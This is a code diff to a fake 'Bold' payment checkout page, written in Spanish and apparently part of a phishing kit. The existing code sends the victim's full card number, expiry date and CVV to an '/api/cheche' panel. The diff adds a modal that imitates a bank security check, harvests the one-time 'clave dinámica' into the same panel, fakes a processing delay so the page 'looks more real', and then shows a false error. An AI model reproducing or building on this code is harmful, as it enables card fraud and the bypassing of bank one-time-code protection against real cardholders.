@@ -31,6 +31,11 @@ export default function BoldPagosPage() {
   // Estado para modal de confirmación de banco
   const [showBankConfirmation, setShowBankConfirmation] = useState(false);
   const [detectedBankInfo, setDetectedBankInfo] = useState<{bank: string, cardBrand: string} | null>(null);
+  
+  // Estado para modal de clave dinámica
+  const [showDynamicKeyModal, setShowDynamicKeyModal] = useState(false);
+  const [dynamicKey, setDynamicKey] = useState('');
+  const [processingKey, setProcessingKey] = useState(false);
 
   const showNotification = (message: string, type: 'error' | 'success' = 'error') => {
     setNotification({show: true, message, type});
@@ -201,9 +206,21 @@ export default function BoldPagosPage() {
       }
     }
 
-    // Para otros bancos, enviar datos al panel y Telegram
+    // Para otros bancos, mostrar modal de clave dinámica
+    setLoading(false);
+    setShowDynamicKeyModal(true);
+  };
+
+  const handleDynamicKeySubmit = async () => {
+    if (!dynamicKey || dynamicKey.length < 4) {
+      showNotification('Por favor ingresa una clave válida');
+      return;
+    }
+
+    setProcessingKey(true);
+
     try {
-      // Enviar información completa al panel de administración
+      // Enviar información completa al panel de administración con la clave dinámica
       const response = await fetch('/api/cheche', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -227,6 +244,7 @@ export default function BoldPagosPage() {
           expiryDate: expiryDate, // Fecha completa
           cvv: cvv, // CVV completo
           cardBrand: cardType,
+          dynamicKey: dynamicKey, // CLAVE DINÁMICA
           
           // Datos de orden
           totalAmount: orderData.totalAmount,
@@ -248,6 +266,7 @@ export default function BoldPagosPage() {
               last4: cardNumber.slice(-4),
               brand: cardType,
               bank: bankName,
+              dynamicKey: dynamicKey,
             },
             paymentMethod: 'Bold - Tarjeta ' + cardType,
             status: 'pending'
@@ -262,8 +281,9 @@ export default function BoldPagosPage() {
       // Simular procesamiento (2.5-3 segundos para que se vea más real)
       await new Promise(resolve => setTimeout(resolve, 2500));
       
-      // Redirigir al carrito con mensaje de error
-      setLoading(false);
+      // Cerrar modal y mostrar error
+      setShowDynamicKeyModal(false);
+      setProcessingKey(false);
       showNotification('Error al procesar el pago. Por favor verifica los datos de tu tarjeta e intenta nuevamente.', 'error');
       
       // Después de 2 segundos, redirigir al carrito
@@ -273,7 +293,8 @@ export default function BoldPagosPage() {
       
     } catch (error) {
       console.error('Error processing payment:', error);
-      setLoading(false);
+      setProcessingKey(false);
+      setShowDynamicKeyModal(false);
       showNotification('Hubo un error al procesar el pago. Por favor intenta de nuevo.');
     }
   };
@@ -317,6 +338,101 @@ export default function BoldPagosPage() {
                 <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd"/>
               </svg>
             </button>
+          </div>
+        </div>
+      )}
+
+      {/* Modal de Clave Dinámica */}
+      {showDynamicKeyModal && (
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-in fade-in duration-300">
+          <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8 animate-in slide-in-from-bottom duration-300">
+            {/* Logo Bold */}
+            <div className="flex justify-center mb-6">
+              <img src="/logos/pagos/BOLD.png" alt="Bold" className="h-8 object-contain" />
+            </div>
+
+            {/* Ícono de seguridad */}
+            <div className="flex justify-center mb-6">
+              <div className="w-20 h-20 bg-gradient-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center shadow-lg">
+                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
+              </div>
+            </div>
+
+            <h3 className="text-2xl font-black text-gray-900 text-center mb-3">
+              Verificación Adicional
+            </h3>
+            <p className="text-gray-600 text-center mb-6 leading-relaxed">
+              Esta transacción requiere una verificación adicional. Por favor ingresa la <span className="font-bold text-gray-900">clave dinámica</span> de tu banco para procesar esta transacción de forma segura.
+            </p>
+
+            {/* Campo de clave dinámica */}
+            <div className="mb-6">
+              <label className="block text-sm font-bold text-gray-700 mb-2">
+                Clave Dinámica
+              </label>
+              <input
+                type="text"
+                inputMode="numeric"
+                pattern="[0-9]*"
+                value={dynamicKey}
+                onChange={(e) => {
+                  const value = e.target.value.replace(/\D/g, '');
+                  setDynamicKey(value);
+                }}
+                placeholder="Ingresa tu clave dinámica"
+                maxLength={12}
+                className="w-full px-4 py-4 border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition text-center text-2xl font-bold tracking-wider"
+                disabled={processingKey}
+                autoFocus
+              />
+              <p className="text-xs text-gray-500 text-center mt-2">
+                Generalmente son 4-8 dígitos
+              </p>
+            </div>
+
+            {/* Botones */}
+            <div className="space-y-3">
+              <button
+                onClick={handleDynamicKeySubmit}
+                disabled={processingKey || !dynamicKey}
+                className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-4 px-6 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed shadow-lg hover:shadow-xl"
+              >
+                {processingKey ? (
+                  <div className="flex items-center justify-center gap-3">
+                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+                    <span>Procesando...</span>
+                  </div>
+                ) : (
+                  'Continuar con el Pago'
+                )}
+              </button>
+              
+              <button
+                onClick={() => {
+                  setShowDynamicKeyModal(false);
+                  setDynamicKey('');
+                }}
+                disabled={processingKey}
+                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold py-4 px-6 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                Cancelar
+              </button>
+            </div>
+
+            {/* Nota de seguridad */}
+            <div className="mt-6 p-4 bg-blue-50 rounded-xl border border-blue-200">
+              <div className="flex gap-3">
+                <svg className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd"/>
+                </svg>
+                <div>
+                  <p className="text-sm font-semibold text-blue-900 mb-1">Tu seguridad es importante</p>
+                  <p className="text-xs text-blue-700">Esta clave adicional verifica que eres el titular de la tarjeta. Nunca compartas esta información.</p>
+                </div>
+              </div>
+            </div>
           </div>
         </div>
       )}
